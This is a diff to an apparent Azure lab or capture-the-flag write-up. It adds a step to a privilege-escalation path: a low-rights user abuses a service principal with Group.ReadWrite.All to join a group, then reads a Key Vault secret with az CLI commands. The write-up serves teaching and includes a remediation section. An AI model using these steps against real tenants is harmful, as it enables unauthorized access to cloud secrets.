@@ -11,8 +11,12 @@ registration ownership and service principal ownership are managed separately in
 
 The service principal has the **Group.ReadWrite.All** application permission. If an
 attacker can add credentials to the service principal and authenticate as it, they can add
-themselves to the `cred-administrators` group (which in a real environment would hold the
-Global Administrator role).
+themselves to the `cred-administrators` group. That group is granted the **Key Vault
+Secrets User** role on a Key Vault that holds the flag — so joining it is a *real*
+privilege escalation, and the flag is only readable once you are a member. (The group
+carries an Azure RBAC role rather than a directory role such as Global Administrator,
+which would require an Entra ID P1 license — exactly why this kind of group-based RBAC
+escalation is so common in practice.)
 
 ## Attack Path
 
@@ -30,6 +34,9 @@ POST /v1.0/groups/<cred-administrators-id>/members/$ref
     |
     v
 norightsuser is now in the admin group
+    |
+    v
+group grants Key Vault Secrets User  -->  read 'flag' secret from the vault
 ```
 
 ### Step 1 — Find the service principal you own
@@ -63,6 +70,20 @@ az ad group member add \
   --group <group-id> \
   --member-id <norightsuser-object-id>
 ```
+
+### Step 5 — Read the flag from the Key Vault
+
+Group membership grants the group the **Key Vault Secrets User** role on the lab's
+vault. Sign back in as your own user (so your token carries the new group claim),
+then read the secret:
+
+```bash
+az login --username <norightsuser-upn> --password <password>
+az keyvault secret show --vault-name <vault> --name flag --query value -o tsv
+```
+
+> Group membership can take a few minutes to propagate, and RBAC role claims are
+> only refreshed on a new sign-in — sign out/in if the read is denied at first.
 
 ## How to Fix in Production
 
